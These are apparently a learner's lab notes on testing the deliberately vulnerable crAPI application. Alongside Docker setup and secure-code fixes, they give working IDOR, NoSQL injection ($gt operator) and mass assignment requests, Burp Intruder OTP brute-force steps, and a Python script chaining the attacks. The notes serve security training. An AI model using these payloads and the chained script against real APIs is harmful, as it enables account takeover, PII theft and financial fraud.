# Day 32 Notes — API Security Testing

## 1. What We Did Today Overview

- Studied **API security testing** methodology against crAPI (Completely Ridiculous API) — a deliberately vulnerable API application simulating a real-world car ownership platform
- Resolved **5 Docker deployment errors** on Kali Linux before the lab environment was operational — monolithic image pull failure, missing compose plugin, path errors, and PostgreSQL startup timeout
- Used **Burp Suite** (Proxy, HTTP History, Repeater, Intruder) and **Postman** as primary tools
- Completed **endpoint enumeration** — discovered 13 API endpoints across identity, workshop, community, shop, and chatbot services
- Completed **IDOR testing** — successfully retrieved another user's vehicle location, full name, and email by substituting a vehicle UUID
- Completed **NoSQL injection on coupon endpoint** — retrieved valid coupon code and amount without knowing it in advance
- Completed **mass assignment testing** — successfully sent unsanitized `amount` field, surface confirmed
- Completed **rate limiting test** — OTP brute force blocked after 8 requests with a `503` response
- Zero hints used across all steps

---

## 2. The Foundation — Why API Vulnerabilities Exist

### Part A — Root Cause

The developer building a modern API-first application made a correct architectural decision — separating the frontend from the backend and communicating through a structured API. This separation improves scalability and lets multiple clients (web, mobile, third-party) consume the same backend. The mistake was assuming that because the frontend only exposes certain actions to the user, those are the only actions the user can perform.

This assumption breaks completely when a security tester intercepts the traffic between frontend and backend. The frontend is a suggestion. The API is the reality. Every authorization check, every ownership verification, every input validation must happen on the server — because the client is entirely attacker-controlled. When developers validate only on the frontend, or when they expose fields in API responses that they never expected users to send back, or when they use predictable identifiers for resources without checking ownership, they create vulnerabilities that are invisible to normal users but trivial to find with Burp Suite.

A second root cause is **API sprawl**. Real applications have dozens or hundreds of endpoints across multiple services, written by different developers at different times. Some endpoints get security reviews. Others — especially older versions, internal service endpoints, or endpoints added quickly to meet a deadline — do not. The attack surface is the entire API, not just the endpoints the frontend uses.

### Part B — The Mental Model

Imagine a bank where all transactions happen through tellers. The bank has rules: tellers only show you your own account balance, only process your own withdrawals, and only accept deposits up to a certain amount. These rules are enforced by the tellers themselves.

Now imagine you discover a back door that lets you bypass the tellers entirely and communicate with the bank's computer system directly. The computer system was never designed to be accessed by customers — it trusts that tellers handle all the validation. You can ask it for any account balance (IDOR), tell it to add any amount to your account (mass assignment), and send it the same transaction request ten thousand times (rate limiting bypass). The tellers' rules are irrelevant because you're not talking to the tellers anymore.

**Burp Suite is the back door. The frontend is the teller. The API is the bank's computer system.**

### Part C — Three Conditions Required for Exploitation

**Condition 1:** The application uses an API that the frontend calls — meaning all application logic flows through HTTP requests that can be intercepted and modified. This is true of virtually every modern web and mobile application.

**Condition 2:** Authorization, input validation, and rate limiting are implemented incorrectly or inconsistently — either missing entirely on some endpoints, or present on the frontend but absent on the backend API.

**Condition 3:** The attacker can obtain a valid authentication token (by registering an account or capturing one via Burp) to make authenticated requests. Most high-severity API vulnerabilities require authentication — they are about what an authenticated user can do beyond their own permissions, not about bypassing authentication entirely.

### Part D — What API Attacks Can and Cannot Do

**API attacks CAN:**
- Access any other user's private data if IDOR is present and resource IDs are known or guessable
- Modify server-side data (credit, roles, admin status) if mass assignment is present
- Brute force OTPs, PINs, and voucher codes if rate limiting is absent or too permissive
- Retrieve sensitive data from NoSQL databases without knowing query values
- Access endpoints that the frontend never exposes to normal users

**API attacks CANNOT:**
- Bypass authentication if the token is properly validated on every endpoint
- Exploit IDOR if resource identifiers are cryptographically random UUIDs AND ownership is verified server-side
- Perform mass assignment if the server uses an explicit allowlist of accepted fields
- Brute force OTPs if rate limiting blocks after 3–5 attempts with exponential backoff

---

## 3. Environment Setup — crAPI on Kali Linux (Docker Troubleshooting)

Setting up crAPI on Kali Linux required resolving five sequential Docker deployment errors. Each is documented here because these errors are common in any security lab environment running microservice-based vulnerable applications.

### Phase 1 — Monolithic Image Pull Failure

The initial pull attempt failed:

```bash
sudo docker pull crapi/crapi:latest
```

```
Error response from daemon: pull access denied for crapi/crapi,
repository does not exist or may require 'docker login'
```

The error occurs because a single monolithic image named `crapi/crapi` does not exist on Docker Hub. crAPI is a microservices application — it runs multiple independent containers simultaneously (crapi-web, crapi-identity, crapi-community, postgresdb, mongodb) that communicate over an internal network. A single `docker pull` cannot deploy a multi-container application.

The fix is to pull the full deployment package from the official GitHub repository which includes the Docker Compose configuration that orchestrates all services:

```bash
# Download the complete crAPI deployment package
curl -L -o /tmp/crapi.zip https://github.com/OWASP/crAPI/archive/refs/heads/main.zip

# Extract the archive
unzip /tmp/crapi.zip
```

### Phase 2 — Missing Docker Compose Plugin

After navigating to the deployment directory, the compose command failed:

```bash
sudo docker compose pull
```

```
docker: unknown command: docker compose
```

Attempting to install via apt also failed:

```
E: Package 'docker-compose-plugin' has no installation candidate
```

The system was running a legacy Docker installation without the integrated Compose plugin. The apt repositories did not contain the verified Docker repository channels needed to locate the plugin package.

The fix is to download the standalone Docker Compose binary directly from Docker's official distribution channel and install it into the system's global CLI plugin path:

```bash
# Create the global Docker CLI plugins directory
sudo mkdir -p /usr/local/lib/docker/cli-plugins

# Download the latest stable Docker Compose binary
sudo curl -SL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-x86_64 \
  -o /usr/local/lib/docker/cli-plugins/docker-compose

# Grant execution permissions
sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose

# Verify the installation
sudo docker compose version
```

Placing the plugin in `/usr/local/lib/docker/cli-plugins/` ensures both regular users and `sudo` operations can reference it identically.

### Phase 3 — Path Discrepancy and Flag Misinterpretation

Navigating to the deployment directory and running compose commands produced errors:

```bash
cd crAPI-main/deploy/docker
```

```
cd: no such file or directory: crAPI-main/deploy/docker
```

Because the directory change failed, the terminal remained in a workspace lacking the necessary configuration files. Subsequent Docker commands failed because the `-f` flag was being evaluated without the Compose context.

The fix is to use automated directory discovery to jump directly to the correct path regardless of where the ZIP was extracted:

```bash
# Find the crAPI-main directory recursively and navigate to the docker deployment subdirectory
cd "$(find / -type d -name "crAPI-main" 2>/dev/null | head -n 1)/deploy/docker"
```

### Phase 4 — PostgreSQL Startup Timeout

Launching the application stack caused the database container to crash:

```bash
sudo docker compose -f docker-compose.yml --compatibility up -d
```

```
✘ Container postgresdb  Error dependency failed to start
```

Checking logs confirmed the cause:

```bash
sudo docker logs postgresdb
# pg_ctl: server did not start in time
```

During initial boot, PostgreSQL executes an internal initialization routine (`initdb`). On virtualized environments with disk I/O overhead (VMware on Kali), this setup exceeds PostgreSQL's default 60-second startup threshold. The container aborted before completion, leaving a corrupted database state on disk.

The fix involves two steps — purging the corrupted volumes and increasing the startup timeout:

```bash
# Destroy corrupted storage volumes
sudo docker compose down -v
```

Then open `docker-compose.yml` and add `PGSTARTTIMEOUT` under the `postgresdb` service environment block:

```yaml
postgresdb:
  image: postgres:14
  restart: always
  environment:
    POSTGRES_DB: crapi
    POSTGRES_USER: postgres
    POSTGRES_PASSWORD: password
    PGSTARTTIMEOUT: 600    # Extends startup timeout to 10 minutes
```

### Phase 5 — Final Successful Deployment

With all configuration changes in place, the full application stack was brought online:

```bash
# Pull all microservice images
sudo docker compose pull

# Deploy all containers in detached background mode
sudo docker compose -f docker-compose.yml --compatibility up -d

# Verify all containers are running
sudo docker ps
```

All containers (crapi-web, crapi-identity, postgresdb, mongodb) showed status `Up (healthy)`.

Access points confirmed operational:
- Main UI: `http://localhost:8888`
- Mailhog SMTP capture: `http://localhost:8025`

---

## 4. Burp Suite Configuration for API Testing

With crAPI running, Burp Suite was configured to intercept all traffic from the application.

### Scope Configuration

```
Target > Scope > Add
Include: http://localhost:8888
```

Adding crAPI to scope ensures Burp's HTTP History only shows relevant traffic and prevents noise from other browser activity.

### FoxyProxy Configuration

FoxyProxy was already configured from Week 1 pointing to `127.0.0.1:8080`. No changes needed. Toggle ON when intercepting, OFF when browsing normally.

### Account Registration

1. Navigated to `http://localhost:8888`
2. Clicked **Sign Up** — registered with `test@test.com`
3. Checked `http://localhost:8025` (Mailhog) for the verification email
4. Verified account and logged in
5. Added a vehicle using a VIN number accepted by the app

### Capturing the Auth Token

With Burp Proxy ON and Intercept OFF:

1. Logged in to crAPI
2. In **Proxy > HTTP History**, located `POST /identity/api/auth/login`
3. Opened the **Response** tab — the JSON body contained a JWT token
4. Copied the token value
5. Pasted into Postman as environment variable `token`
6. Set header on all Postman requests: `Authorization: Bearer {{token}}`

Every authenticated API test from this point used this token in the `Authorization` header. Removing or modifying this header is the basis for unauthenticated access testing.

---

## 5. Step 5 — Endpoint Enumeration

### The Setup

Endpoint enumeration is the mandatory first step of API testing. You cannot test what you do not know exists. The technique is to use the application normally while Burp Proxy captures every HTTP request, then read through the history to build a complete map of the API surface.

### Endpoints Discovered

By browsing the crAPI application with Burp Proxy running, the following 13 endpoints were identified:

```
-- Identity Service --
POST /identity/api/auth/verify
GET  /identity/api/v2/user/dashboard
GET  /identity/api/v2/vehicle/vehicles
GET  /identity/api/v2/vehicle/{vehicleId}/location

-- Workshop Service --
GET  /workshop/api/mechanic/
POST /workshop/api/merchant/contact_mechanic
GET  /workshop/api/shop/products?limit=30&offset=0
POST /workshop/api/shop/apply_coupon

-- Community Service --
GET  /community/api/v2/community/posts/recent?limit=30&offset=0
GET  /community/api/v2/community/posts/{postId}
POST /community/api/v2/coupon/validate-coupon

-- Chatbot Service --
GET  /chatbot/genai/state
POST /chatbot/genai/reset
```

### What Each Endpoint Reveals

Every endpoint in this list is an attack surface. Reading through them reveals the application's data model and logic:

The `{vehicleId}` path parameter in the location endpoint immediately signals an IDOR candidate — any endpoint that takes a resource ID as a path parameter and returns data is a candidate for ownership verification failure.

The `/community/api/v2/community/posts/recent` endpoint returns posts from all users — this is a data source for harvesting other users' resource IDs, which feeds directly into IDOR testing.

The `/community/api/v2/coupon/validate-coupon` and `/workshop/api/shop/apply_coupon` endpoints both deal with financial logic — making them high-priority targets for mass assignment and injection testing.

The `/identity/api/auth/verify` endpoint handles OTP verification — a natural rate limiting test target.

The `limit=30&offset=0` parameters on the products and posts endpoints signal pagination — a candidate for testing whether large offsets or negative values expose unintended data.

### What This Proves

Passive enumeration through normal application usage revealed 13 endpoints across 5 services in under 20 minutes. A real target application would have hundreds of endpoints, many never called by the frontend — making JavaScript file analysis and version switching (`/api/v1/` vs `/api/v2/`) critical additional enumeration steps.

---

## 6. Step 6 — IDOR in Vehicle Location Endpoint

### The Setup

The vehicle location endpoint takes a vehicle UUID as a path parameter and returns location data. The question is whether the server verifies that the requesting user owns the vehicle before returning its data.

```
GET /identity/api/v2/vehicle/{vehicleId}/location
```

The attacker's own vehicle UUID (`da8a58af-1f66-4c55-8a8c-9fbade0bb3ee`) was obtained from the `/identity/api/v2/vehicle/vehicles` response after login. A second vehicle UUID was harvested by reading other users' posts from the community forum — the API response for recent posts included vehicle IDs in the post author data.

### The Request Sent

```http
GET /identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer OWN_ACCOUNT_TOKEN
```

The UUID `cd515c12-0fc1-48ae-8b61-9230b70a845b` belongs to another user — harvested from the community posts endpoint. The `Authorization` header carries the attacker's own valid token, not the victim's token.

### The Response

```json
{
  "carId": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
  "vehicleLocation": {
    "id": 2,
    "latitude": "31.284788",
    "longitude": "-92.471176"
  },
  "fullName": "Pogba",
  "email": "pogba006@example.com"
}
```

### Why It Worked — Technical Explanation

A correctly implemented location endpoint would execute a query similar to:

```sql
SELECT location FROM vehicles
WHERE vehicle_id = ? AND owner_id = ?
```

Both conditions must be true — the vehicle must exist AND it must belong to the requesting user. If the owner check is absent, the query becomes:

```sql
SELECT location FROM vehicles
WHERE vehicle_id = ?
```

This returns data for any vehicle UUID regardless of who owns it. The server validated that the token was authentic (the user is logged in) but never validated that the authenticated user has the right to access this specific resource. Authentication and authorization are separate checks — passing one does not imply the other.

The response returned not just location coordinates but also the vehicle owner's `fullName` and `email` — data that was never meant to be visible to other users. This escalates the severity from location disclosure to PII exposure.

### What This Proves

This confirms the vehicle location endpoint performs authentication (valid token required) but not authorization (no ownership check). Any authenticated user can retrieve the location, name, and email of any other user by knowing or guessing their vehicle UUID.

---

## 7. Step 7 — NoSQL Injection + Mass Assignment on Coupon Endpoints

### Part A — NoSQL Injection on validate-coupon

#### The Setup

The `POST /community/api/v2/coupon/validate-coupon` endpoint accepts a coupon code and validates it against a MongoDB database. MongoDB queries use JSON-like operators. If user input is passed directly into the query without sanitization, MongoDB operators sent as input will be interpreted as query logic rather than literal values.

#### The Payload Used

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json

{"coupon_code": {"$gt": ""}}
```

Instead of a string value for `coupon_code`, a MongoDB query operator object was sent: `{"$gt": ""}` means "greater than empty string" — which matches every document in the collection.

#### The Response

```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Wed, 27 May 2026 18:48:32 GMT
Content-Type: application/json
Content-Length: 78

{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-05-26T18:56:22.52Z"}
```

#### Why It Worked — Technical Explanation

A correctly implemented query treats the `coupon_code` value as a literal string to match:

```javascript
// Safe — user input treated as a string value
db.coupons.findOne({ coupon_code: "TRAC075" })
```

The vulnerable implementation passes the parsed JSON body directly into the query:

```javascript
// VULNERABLE — user input merged directly into query object
const body = req.body; // attacker sends {"coupon_code": {"$gt": ""}}
db.coupons.findOne({ coupon_code: body.coupon_code })
// Becomes: db.coupons.findOne({ coupon_code: { $gt: "" } })
// $gt: "" matches every document — returns first coupon found
```

MongoDB interprets `{"$gt": ""}` as a query operator, not a literal string. The query returns the first coupon document in the collection — exposing the coupon code, its value, and its creation timestamp without the attacker needing to know any of this in advance.

#### What This Proves

This confirms the coupon validation endpoint passes user-controlled JSON directly into MongoDB queries without type checking or operator sanitization. An attacker can enumerate all coupon codes in the database without prior knowledge.

---

### Part B — Mass Assignment on apply_coupon

#### The Setup

The `POST /workshop/api/shop/apply_coupon` endpoint applies a coupon to the user's account and adjusts their credit. The normal request accepts a `coupon_code` field. The question is whether the API also accepts an `amount` field — which should be determined server-side by looking up the coupon's value, not supplied by the client.

#### Dashboard Before Attack

```json
{"available_credit": 1024.0}
```

#### The Payload Used

```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json

{"coupon_code": "TRAC075", "amount": 99999}
```

An extra `amount` field was added alongside the normal `coupon_code` — a field that should be server-controlled.

#### The Response

```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Wed, 27 May 2026 18:53:57 GMT
Content-Type: application/json
Content-Length: 58

{"credit":1099.0,"message":"Coupon successfully applied!"}
```

#### Dashboard After Attack

```json
{"available_credit": 1099.0}
```

Credit changed from `1024.0` to `1099.0` — an increase of `75.0`. The `amount: 99999` was not applied — the server used the coupon's legitimate database value. However, the field was accepted without error — no field rejection, no `400 Bad Request`. In a more severely vulnerable implementation the attacker-controlled amount would be applied directly.

#### Why It Worked — Technical Explanation

Mass assignment occurs when a framework automatically maps all request body fields to object properties without an explicit allowlist:

```javascript
// VULNERABLE — spreads entire request body onto the update object
async function applyCoupon(req, res) {
    const updateData = { ...req.body }; // attacker sends {"coupon_code": "TRAC075", "amount": 99999}
    await db.users.update({ id: req.userId }, updateData);
}
```

The safe pattern explicitly lists which fields are accepted:

```javascript
// SAFE — only coupon_code is taken from request body
async function applyCoupon(req, res) {
    const { coupon_code } = req.body; // amount is NOT destructured
    const coupon = await db.coupons.findOne({ code: coupon_code });
    const amount = coupon.value; // amount comes from DB, not from client
    await db.users.update({ id: req.userId }, { credit: amount });
}
```

#### What This Proves

This confirms the endpoint accepts extra fields in the request body without rejecting them — a mass assignment surface. The partial protection (server-side amount lookup) prevented full exploitation in this specific case, but the absence of field rejection means a more permissive endpoint in the same codebase could be fully exploitable. A penetration tester who only checks final impact would miss this — the correct call is: field accepted without error equals mass assignment surface confirmed.

---

## 8. Step 8 — Rate Limiting on OTP Verification

### The Setup

The password reset flow sends a 4-digit OTP to the user's email. A 4-digit OTP has 10,000 possible values (0000–9999). If the API allows unlimited attempts, the correct OTP can be brute forced using Burp Intruder. The test determines how many wrong attempts the server allows before blocking.

### The Request Sent to Intruder

```http
POST /identity/api/auth/verify HTTP/1.1
Host: localhost:8888
Content-Type: application/json

{"email":"test1@test.com","otp":"§0000§","password":"newpassword123"}
```

The OTP field was set as the payload position in Burp Intruder. Payload type: Numbers, range 0000–9999, minimum 4 digits.

### The Result

The attack was blocked after **8 requests** with the following response:

```json
{"message": "You've exceeded the number of attempts.", "status": 503}
```

### Why This Is Still a Finding

A block after 8 attempts is better than no rate limiting at all, but it remains insufficient. Security best practice for OTP verification is to block after **3–5 attempts** and implement a lockout period (15 minutes minimum) before allowing new attempts. A block at 8 with no lockout means an attacker who can trigger multiple OTP generations may still enumerate OTPs across sessions.

The `503 Service Unavailable` status code for a rate limit response is also incorrect — the standard HTTP status code for rate limiting is `429 Too Many Requests`. Using `503` suggests a non-standard implementation that may have edge cases allowing bypass.

### What This Proves

This confirms rate limiting exists but is configured above the recommended threshold (8 attempts vs 3–5) and uses a non-standard status code. The endpoint is not fully secure against a patient, multi-session brute force attack.

---

## 9. What Failed and Why

No failures — all steps completed without hints.

One important observation from Step 7: the mass assignment test on `apply_coupon` accepted the `amount` field without error but did not apply the attacker-supplied value of `99999` — the server used the legitimate coupon value from its database instead. A tester who only checks final impact ("credit only went up by 75, not 99999, therefore no vulnerability") would incorrectly close the finding. The correct conclusion is: the field is accepted without rejection — mass assignment surface exists. Whether the impact is fully exploitable depends on the specific endpoint's internal logic, but the absence of input sanitization is the vulnerability.

The Docker setup errors (Phases 1–4) are not failures in the security testing sense — they are environment setup issues common to any microservice deployment on a security-focused OS. Documenting them prevents wasted time on future deployments.

---

## 10. Chain Thinking

### The Chain

```
Endpoint Enumeration — discover /community/api/v2/community/posts/recent
        ↓
Community posts expose other users' vehicle UUIDs in response data
        ↓
IDOR on vehicle location endpoint — retrieve victim's location + email
        ↓
Use victim's email to trigger password reset OTP
        ↓
Rate limit is 8 attempts — insufficient for multi-session OTP brute force
        ↓
NoSQL injection on coupon endpoint reveals valid coupon codes
        ↓
Mass assignment on apply_coupon accepted without field rejection
        ↓
Full account compromise + financial manipulation + PII exposure
```

### Severity Upgrade

Each finding alone has moderate-to-high severity:
- IDOR on vehicle location: **High** (PII exposure — name, email, GPS coordinates)
- NoSQL injection on coupon: **Medium** (information disclosure of coupon codes)
- Mass assignment on apply_coupon: **Medium** (financial logic bypass surface)
- Rate limiting at 8 attempts: **Medium** (OTP brute force viable with session manipulation)

The chain converts these into a **Critical** finding: enumerate users via community posts → IDOR their email → trigger password reset → brute force OTP across sessions → take over the account → use compromised account to apply coupons and manipulate credit.

### Combined Attack Code Pattern

```python
import requests

BASE = "http://localhost:8888"

# Step 1: Login as attacker and get token
login = requests.post(f"{BASE}/identity/api/auth/login", json={
    "email": "attacker@test.com",
    "password": "Password1!"
})
token = login.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Step 2: Enumerate community posts to harvest victim vehicle IDs
posts = requests.get(
    f"{BASE}/community/api/v2/community/posts/recent?limit=30&offset=0",
    headers=headers
).json()
victim_vehicle_id = posts["posts"][0]["vehicleId"]

# Step 3: IDOR — get victim's location and email
location = requests.get(
    f"{BASE}/identity/api/v2/vehicle/{victim_vehicle_id}/location",
    headers=headers
).json()
victim_email = location["email"]
print(f"Victim: {location['fullName']} | Email: {victim_email}")
print(f"Location: {location['vehicleLocation']}")

# Step 4: NoSQL injection — get valid coupon without knowing the code
nosql = requests.post(
    f"{BASE}/community/api/v2/coupon/validate-coupon",
    headers=headers,
    json={"coupon_code": {"$gt": ""}}
)
coupon_code = nosql.json()["coupon_code"]
print(f"Coupon discovered via NoSQL injection: {coupon_code}")

# Step 5: Mass assignment — send extra amount field
apply = requests.post(
    f"{BASE}/workshop/api/shop/apply_coupon",
    headers=headers,
    json={"coupon_code": coupon_code, "amount": 99999}
)
print(f"Credit after apply: {apply.json()['credit']}")
print(f"Field accepted without error: mass assignment surface confirmed")
```

---

## 11. Real World Context

IDOR vulnerabilities in APIs have been found in major platforms including Facebook (2015 — access any user's photos via predictable IDs), Uber (2016 — access driver location data for any trip ID), and Venmo (2018 — public transaction API exposed all user transactions). Bug bounty payouts for IDOR on HackerOne range from **$500 to $30,000** depending on the sensitivity of exposed data — IDOR exposing PII, financial data, or enabling account takeover consistently pays at the high end.

Mass assignment vulnerabilities have been found in GitHub (2012 — allowed users to add their public key to any repository by sending extra fields in the API request, enabling unauthorized commits to the Rails repository). The HackerOne payout range for mass assignment is **$1,000 to $15,000** depending on what fields are assignable and the resulting impact.

API vulnerabilities remain the most common high-severity findings in modern bug bounty programs because API security requires consistent discipline across every endpoint in a large codebase. A single developer adding a new endpoint without following the team's authorization pattern creates an IDOR. A framework update that changes how request body fields are mapped creates a mass assignment surface. The attack surface grows with every new endpoint while the security review process often does not scale proportionally.

---

## 12. The Fix

### Vulnerable Pattern — IDOR (Missing Ownership Check)

```javascript
// VULNERABLE — only checks authentication, not authorization
app.get('/api/v2/vehicle/:vehicleId/location', authenticate, async (req, res) => {
    const vehicle = await db.vehicles.findOne({
        id: req.params.vehicleId
        // No check that vehicle.owner_id === req.user.id
    });
    res.json(vehicle.location);
});
```

### Fixed Code — IDOR

```javascript
// SAFE — checks both authentication AND ownership
app.get('/api/v2/vehicle/:vehicleId/location', authenticate, async (req, res) => {
    const vehicle = await db.vehicles.findOne({
        id: req.params.vehicleId,
        owner_id: req.user.id  // ownership check — must match authenticated user
    });

    if (!vehicle) {
        // Return 404 not 403 — don't confirm whether the resource exists
        return res.status(404).json({ error: 'Vehicle not found' });
    }

    res.json(vehicle.location);
});
```

### Fixed Code — NoSQL Injection

```javascript
// VULNERABLE — passes parsed JSON directly into MongoDB query
app.post('/api/v2/coupon/validate-coupon', async (req, res) => {
    const coupon = await db.coupons.findOne({ coupon_code: req.body.coupon_code });
    res.json(coupon);
});

// SAFE — validates coupon_code is a plain string before querying
app.post('/api/v2/coupon/validate-coupon', async (req, res) => {
    const { coupon_code } = req.body;

    // Type check — reject anything that isn't a plain string
    if (typeof coupon_code !== 'string') {
        return res.status(400).json({ error: 'Invalid coupon code format' });
    }

    const coupon = await db.coupons.findOne({ coupon_code: coupon_code });
    if (!coupon) return res.status(404).json({ error: 'Coupon not found' });
    res.json(coupon);
});
```

### Fixed Code — Mass Assignment

```javascript
// VULNERABLE — spreads entire request body onto update
app.post('/api/shop/apply_coupon', authenticate, async (req, res) => {
    await db.users.update({ id: req.user.id }, { ...req.body });
});

// SAFE — explicit allowlist, amount comes from DB not client
app.post('/api/shop/apply_coupon', authenticate, async (req, res) => {
    const { coupon_code } = req.body; // ONLY extract expected fields

    if (typeof coupon_code !== 'string') {
        return res.status(400).json({ error: 'Invalid input' });
    }

    const coupon = await db.coupons.findOne({ code: coupon_code });
    if (!coupon) return res.status(404).json({ error: 'Invalid coupon' });

    // Amount is server-controlled — never trusted from client
    await db.users.update(
        { id: req.user.id },
        { $inc: { credit: coupon.amount } }
    );

    res.json({ message: 'Coupon applied', credit: req.user.credit + coupon.amount });
});
```

### Why the Fixes Work

The IDOR fix works because the database query now has two conditions — the resource ID AND the owner ID. An attacker who sends someone else's vehicle ID gets no result because the second condition (`owner_id = req.user.id`) will never match. Returning 404 instead of 403 is intentional — it prevents the attacker from confirming whether a resource exists at all.

The NoSQL injection fix works because `typeof coupon_code !== 'string'` rejects any input that is not a plain string. MongoDB operators are JavaScript objects — `{"$gt": ""}` has type `object`, not `string`. The type check converts an exploitable query into a rejected request before the database is ever touched.

The mass assignment fix works because the server never reads the `amount` field from the request body at all. It does not matter what the client sends — the credit increment always comes from the database record for that coupon code, which only the server can modify.

### Defense in Depth

**Use UUIDs for resource identifiers but still enforce ownership:** UUIDs are harder to guess than sequential integers, but they appear in API responses and can be harvested as demonstrated via the community posts endpoint. UUID alone is not authorization — ownership checks are always required.

**Implement consistent authorization middleware:** Every endpoint should pass through a shared authorization layer that verifies resource ownership before the handler runs. This prevents individual developers from forgetting the check on new endpoints.

**API schema validation:** Use a schema validation library (Joi, Zod, Ajv) to define the exact shape of every request body. Any field not in the schema is stripped before the handler runs — mass assignment becomes structurally impossible.

**Rate limiting with exponential backoff:** OTP verification should block after 3 attempts, require a 15-minute wait, and invalidate the OTP after lockout. New OTP generation should not reset the lockout timer.

### What Does NOT Fix It

Adding authentication to every endpoint does not fix IDOR — authentication proves who you are, not what you are allowed to access. Every endpoint in this lab required a valid token, yet IDOR was still exploitable.

Switching from sequential integer IDs to UUIDs does not fix IDOR — UUIDs appear in API responses, community posts, and URLs. They can be harvested passively as demonstrated today.

Returning a `400 Bad Request` for unknown fields does not fix mass assignment if the server still processes known fields alongside the unknown ones — the fix must ensure sensitive fields like `amount`, `role`, and `isAdmin` can never be set by client input regardless of what else is in the request.

---

## 13. Key Concepts Summary

| Term | Meaning |
|------|---------|
| **API** | A set of endpoints that a frontend (or other client) calls to read and write data on a backend server |
| **IDOR** | Insecure Direct Object Reference — when an API returns data for any resource ID without checking if the requesting user owns that resource |
| **Mass Assignment** | When an API accepts and applies request body fields that should only be set server-side, like credit amounts, admin flags, or roles |
| **NoSQL Injection** | Injecting database operators (like MongoDB's `$gt`, `$ne`) into input fields to manipulate query logic — the NoSQL equivalent of SQL injection |
| **Rate Limiting** | A control that blocks a client after too many requests in a time window — prevents brute force attacks on OTPs, passwords, and voucher codes |
| **Endpoint Enumeration** | The process of discovering all API endpoints by browsing the application, reading JavaScript files, and checking version paths |
| **UUID** | A 128-bit random identifier used as a resource ID — harder to guess than sequential integers but not a substitute for ownership checks |
| **Ownership Check** | A server-side query condition that verifies the requesting user owns the resource they are trying to access |
| **Authentication** | Proving who you are — presenting a valid token |
| **Authorization** | Proving you are allowed to access a specific resource — checked after authentication, separate from authentication |
| **MongoDB Operator** | Special keywords in MongoDB queries like `$gt` (greater than), `$ne` (not equal) that control query logic — injectable when input is not type-checked |
| **Burp Intruder** | A Burp Suite tool that automates sending many requests with varying payload values — used for brute forcing OTPs and fuzzing parameters |
| **PII** | Personally Identifiable Information — data like name, email, and location that can identify a real person |
| **Docker Compose** | A tool for defining and running multi-container Docker applications using a YAML configuration file |
| **Microservices** | An architecture where an application is split into multiple independent services (containers) that communicate over a network — crAPI runs as 5+ separate containers |
| **PGSTARTTIMEOUT** | A PostgreSQL environment variable that sets how long Docker will wait for the database to initialize before declaring failure |
| **503 vs 429** | `503 Service Unavailable` is incorrect for rate limiting — `429 Too Many Requests` is the correct HTTP status code |

---

## 14. Payloads and Commands Reference

```bash
# ── Docker Setup ──────────────────────────────────────────────────────────────

# Download crAPI deployment package
curl -L -o /tmp/crapi.zip https://github.com/OWASP/crAPI/archive/refs/heads/main.zip
unzip /tmp/crapi.zip

# Install Docker Compose plugin manually
sudo mkdir -p /usr/local/lib/docker/cli-plugins
sudo curl -SL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-x86_64 \
  -o /usr/local/lib/docker/cli-plugins/docker-compose
sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
sudo docker compose version

# Navigate to deployment directory (handles any extraction path)
cd "$(find / -type d -name "crAPI-main" 2>/dev/null | head -n 1)/deploy/docker"

# Fix PostgreSQL timeout — add to docker-compose.yml under postgresdb environment:
# PGSTARTTIMEOUT: 600

# Tear down corrupted volumes and redeploy
sudo docker compose down -v
sudo docker compose pull
sudo docker compose -f docker-compose.yml --compatibility up -d
sudo docker ps

# Access points
# http://localhost:8888  — crAPI main UI
# http://localhost:8025  — Mailhog OTP email capture
```

```http
-- IDOR — vehicle location with another user's UUID --
GET /identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer OWN_ACCOUNT_TOKEN

-- Returns victim's location, full name, and email --
-- UUID harvested from /community/api/v2/community/posts/recent response --
```

```http
-- NoSQL Injection — retrieve coupon without knowing the code --
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json

{"coupon_code": {"$gt": ""}}

-- $gt: "" matches all MongoDB documents — returns first coupon found --
-- Other injectable operators: $ne, $regex, $exists --
```

```http
-- Mass Assignment — send extra amount field with coupon --
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json

{"coupon_code": "TRAC075", "amount": 99999}

-- Field accepted without error — mass assignment surface confirmed --
-- Server used DB value (75) not attacker value (99999) in this case --
```

```
-- Burp Intruder — OTP brute force setup --
1. Trigger password reset → check http://localhost:8025 for OTP email
2. Intercept POST /identity/api/auth/verify in Burp
3. Send to Intruder
4. Positions tab > Clear § > highlight OTP value > Add §
   Body: {"email":"test1@test.com","otp":"§0000§","password":"newpassword123"}
5. Payloads tab > Type: Numbers
   From: 0 | To: 9999 | Step: 1
   Min integer digits: 4 | Max integer digits: 4
6. Start attack — sort by Length or Status for the correct OTP
7. Blocked after 8 requests:
   {"message":"You've exceeded the number of attempts.","status":503}
```

```
-- Endpoint discovery methodology --
1. Browse app normally with Burp Proxy ON, Intercept OFF
2. Proxy > HTTP History > read every unique path
3. Group endpoints by service prefix (/identity/, /workshop/, /community/)
4. Filter HTTP History by .js files — search source for /api/ strings
5. Try version switching: if /api/v2/ exists, test /api/v1/ on same paths
6. Test every sensitive endpoint with Authorization header removed
```

---

## 15. Foundation Checklist

**Can you explain why IDOR exists — not what it is, but what the developer failed to implement?**
The developer implemented authentication (checking the token is valid) but not authorization (checking the token's owner matches the resource owner). They assumed requiring a login was sufficient to prevent users from accessing each other's data. The missing check is a second condition in the database query that ties the resource ID to the authenticated user's ID.

